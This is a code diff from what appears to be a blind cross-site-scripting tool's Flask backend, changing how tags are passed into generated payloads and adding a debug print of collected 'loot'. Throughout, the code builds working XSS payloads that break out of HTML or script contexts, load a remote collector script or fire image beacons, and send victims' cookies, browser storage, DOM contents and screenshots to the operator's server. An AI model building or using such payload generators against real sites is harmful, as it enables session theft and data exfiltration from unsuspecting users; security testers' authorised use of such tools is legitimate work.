@@ -43,14 +43,14 @@ def xss_generate():
 
     to_gather = data.get("to_gather", [])
 
-    custom_tags = data.get("custom_tags", [])
-    custom_tags_dict = {e["key"]: e["value"] for e in custom_tags if e["key"] and e["value"]}
+    tag_list = data.get("tags", [])
+    tags = ",".join(tag_list)
 
     if code_type == "html":
         if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
             payload_start = f'\'>"><script src={url}/static/collector.min.js></script><script>sendData("'
             payload_mid = base64.b64encode(
-                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "custom_tags": custom_tags_dict}))
+                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
             ).decode()
             payload_end = '")</script>'
             payload = payload_start + payload_mid + payload_end
@@ -59,18 +59,18 @@ def xss_generate():
         elif "local_storage" in to_gather or "session_storage" in to_gather or "cookies" in to_gather or "origin" in to_gather or "referrer" in to_gather:
             payload_start = f'\'>"><script>new Image().src="{url}/api/x/{xss_type}/{client.uid}?'
 
-            payload_custom_tags = "&".join({f"{k}={v}" for k, v in custom_tags_dict.items()})
+            payload_tags = f"tags={tags}" if tags else ""
             payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
 
-            payload_mid = "&".join([payload_custom_tags, payload_to_gather]) if payload_custom_tags else payload_to_gather
+            payload_mid = "&".join([payload_tags, payload_to_gather]) if payload_tags else payload_to_gather
             payload_end = "</script>"
             payload = payload_start + payload_mid + payload_end
             return jsonify({"status": "OK", "detail": payload}), 200
 
         else:
             payload_start = f'\'>"><img src="{url}/api/x/{xss_type}/{client.uid}'
-            payload_custom_tags = "&".join({f"{k}={v}" for k, v in custom_tags_dict.items()})
-            payload_start = f"{payload_start}?{payload_custom_tags}" if payload_custom_tags else payload_start
+            payload_tags = f"tags={tags}" if tags else ""
+            payload_start = f"{payload_start}?{payload_tags}" if payload_tags else payload_start
             payload_end = '" />'
             payload = payload_start + payload_end
             return jsonify({"status": "OK", "detail": payload}), 200
@@ -79,7 +79,7 @@ def xss_generate():
         if "fingerprint" in to_gather or "dom" in to_gather or "screenshot" in to_gather:
             payload_start = f';}};var js=document.createElement("script");js.src="{url}/static/collector.min.js";js.onload=function(){{sendData("'
             payload_mid = base64.b64encode(
-                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "custom_tags": custom_tags_dict}))
+                str.encode(json.dumps({"url": f"{url}/api/x/{xss_type}/{client.uid}", "to_gather": to_gather, "tags": tag_list}))
             ).decode()
 
             payload_end = '")};document.body.appendChild(js);'
@@ -89,16 +89,16 @@ def xss_generate():
         else:
             payload_start = f';}};new Image().src="{url}/api/x/{xss_type}/{client.uid}"'
 
-            payload_custom_tags = "&".join({f"{k}={v}" for k, v in custom_tags_dict.items()})
+            payload_tags = f"tags={tags}" if tags else ""
             payload_to_gather = "&".join([v for k, v in PAYLOADS.items() if k in to_gather]).rstrip('+"')
 
-            payload_start = f"""{payload_start.rstrip('"')}?""" if payload_custom_tags or payload_to_gather else payload_start
+            payload_start = f"""{payload_start.rstrip('"')}?""" if payload_tags or payload_to_gather else payload_start
 
             payload_mid = ""
-            if payload_custom_tags and payload_to_gather:
-                payload_mid = "&".join([payload_custom_tags, payload_to_gather])
-            elif payload_custom_tags:
-                payload_mid = payload_custom_tags
+            if payload_tags and payload_to_gather:
+                payload_mid = "&".join([payload_tags, payload_to_gather])
+            elif payload_tags:
+                payload_mid = payload_tags
             elif payload_to_gather:
                 payload_mid = payload_to_gather
 
@@ -209,4 +209,5 @@ def client_loot_get():
             else:
                 loot[element[0]].append({hit.id: element[1]})
 
+    print(loot)
     return jsonify(loot), 200
